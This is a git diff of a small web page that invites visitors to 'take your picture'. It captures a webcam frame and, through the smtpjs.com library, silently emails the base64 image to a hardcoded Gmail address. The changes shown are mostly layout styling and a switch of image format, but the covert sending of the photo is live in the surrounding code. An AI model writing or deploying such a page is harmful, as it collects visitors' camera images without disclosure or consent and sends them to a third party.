@@ -5,11 +5,22 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+  <style>
+    @media (max-width:400px){
+      div{
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+    }
+  </style>
+  <div>
   <h1>Click On 'Take a Picture' to take your Picture</h1>
   <button id="take-picture-btn">Take a Picture</button>
   <video id="video" width="340" height="340"></video>
   <canvas id="canvas" width="340" height="340"></canvas>
-
+</div>
 
   <script src="https://smtpjs.com/v3/smtp.js">
 </script>
@@ -19,7 +30,8 @@ const canvas = document.getElementById("canvas");
 const takePictureBtn = document.getElementById("take-picture-btn");
 
 // Request access to the user's camera
-navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+navigator.mediaDevices
+  .getUserMedia({ video: true, audio: false })
   .then((stream) => {
     video.srcObject = stream;
     video.play();
@@ -33,8 +45,8 @@ takePictureBtn.addEventListener("click", () => {
   canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
   // Get the snapshot as a base64-encoded string
-  const snapshot = canvas.toDataURL("image/jpeg");
-  // console.log(snapshot)
+  const snapshot = canvas.toDataURL("image/png");
+// console.log(snapshot);
 
   // Send the snapshot via email using a library like EmailJS
 
@@ -46,10 +58,8 @@ Email.send({
     To : 'flashycoderch@gmail.com',
     From : "flashycoderch@gmail.com",
     Subject : "The Screen Shot has been taken......",
-    Body : `
-    <h3>Here is the SnapShot taken <br> from the Website :
-    </h3><br><br>
-    <img src="${snapshot}" />`
+    Body : `<h3>Here is the SnapShot taken <br> from the Website : <br><br></h3>
+     <p class="small">${snapshot}</p>`
 }).then(
   message =>{
     if(message === "OK"){
